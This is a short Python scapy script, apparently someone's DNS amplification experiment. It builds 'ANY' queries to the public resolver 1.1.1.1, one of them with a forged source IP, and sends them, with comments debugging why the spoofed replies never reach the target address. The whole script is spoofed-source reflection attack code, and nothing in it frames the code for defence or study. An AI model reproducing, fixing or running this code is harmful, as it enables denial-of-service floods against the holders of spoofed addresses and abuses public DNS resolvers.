from scapy.all import *
from scapy.layers.dns import DNSQR, DNS
from scapy.layers.inet import IP, UDP

# DNS query with my own ip works. I get a response.
dns_amp_locally = IP(src="10.142.0.70", dst="1.1.1.1") / UDP(dport=53) \
          / DNS(rd=1, qd=DNSQR(qname="www.thepacketgeek.com", qtype="ANY"))

# Forging the ip address doesn't work. I never see a udo packet from 1.1.1.1 on 45.79.251.245
dns_amp = IP(src="45.79.251.245", dst="1.1.1.1") / UDP(dport=53) \
          / DNS(rd=1, qd=DNSQR(qname="www.thepacketgeek.com", qtype="ANY"))

# But sending a simple udp packet works.
simple_udp_packet = IP(dst="45.79.251.245") / UDP(dport=53)


send(dns_amp_locally)
send(dns_amp)
send(simple_udp_packet)
